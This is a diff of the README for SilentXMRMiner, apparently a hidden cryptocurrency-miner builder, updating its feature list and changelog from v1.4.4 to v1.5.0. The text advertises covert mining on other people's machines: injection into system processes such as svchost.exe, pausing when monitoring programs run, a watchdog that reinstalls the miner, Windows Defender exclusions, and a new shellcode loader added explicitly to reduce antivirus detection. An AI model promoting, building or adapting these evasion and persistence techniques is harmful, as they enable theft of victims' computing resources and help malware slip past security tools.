@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v1.4.4 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.5.0 - Based on Lime Miner v0.3
 
 Can mine all the following algorithms and thus all the cryptocurrencies that use them:
 <details>
@@ -43,15 +43,16 @@ Can mine all the following algorithms and thus all the cryptocurrencies that use
 
 ## Main Features
 
-* .NET - Coded in C#, requires .NET Framework 4.5
-* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or some other process
+* Native & .NET - Miner installer and watchdog coded in C#, Shellcode loader/injector coded in C, miner requires .NET Framework 4.5
+* Shellcode - All .NET C# parts are converted into Shellcode and injected using a native C loader, can be disabled
+* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or other process
 * CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
 * Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
 * Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
 * Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
 * Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
 * Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
-* Online Downloader - Can download the miner binary during runtime to greatly decrease file size and detections
+* Online Downloader - Can download the miner binary during runtime to greatly decrease file size
 
 ## Downloads
 
@@ -67,21 +68,16 @@ You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/w
 
 ## Changelog
 
-### v1.4.4 (07/08/2021)
-* **Any old miner using "Online Download" will automatically get this update for any new clients**
-* Now gets the Remote Configuration every 100 minutes
-* Added failover capability for the Remote Configuration URL, add several URLs by separating them by a comma (,)
-* Changed the Remote Configuration scheme from INI to JSON, can still read INI files for backwards compatibility
-* Added capabilities to change more miner settings with Remote Configuration
-* Migrated from {%COMPUTERNAME%}, {%USERNAME%} and {%RANDOM%} to {COMPUTERNAME}, {USERNAME} and {RANDOM} but the old ones will still work for backwards compatibility
-* Now replaces {COMPUTERNAME}, {USERNAME} and {RANDOM} with their respective values when using Remote Configuration
-* Fixed possible Idle activation crash on Windows 7
-* Added the Stealth Targets option which allows you to enter which programs the Stealth option should pause for
-* Added algorithm selection to make it easier to use
-* Fixed the GPU detection for systems that have custom lowercase characters like Turkish, seems like I failed the "Turkey Test" again
-* Fixed broken builder help tooltips
-* Major miner update/rework
-* Improved miner stability
+### v1.5.0 (02/10/2021)
+* **The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
+* Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
+* Added custom tcc C compiler to compile the Shellcode loader
+* Added custom windres resource compiler to allow icons, assembly data and run as administrator for the native C program
+* Added donut to convert .NET programs into Shellcode
+* Added option to disable Shellcode loader
+* Remade and optimized much of the miner and watchdog code
+* Removed old C# loader
+* Renamed Install to Startup due to confusion
 
 [You can view the full Changelog here](CHANGELOG.md)
 
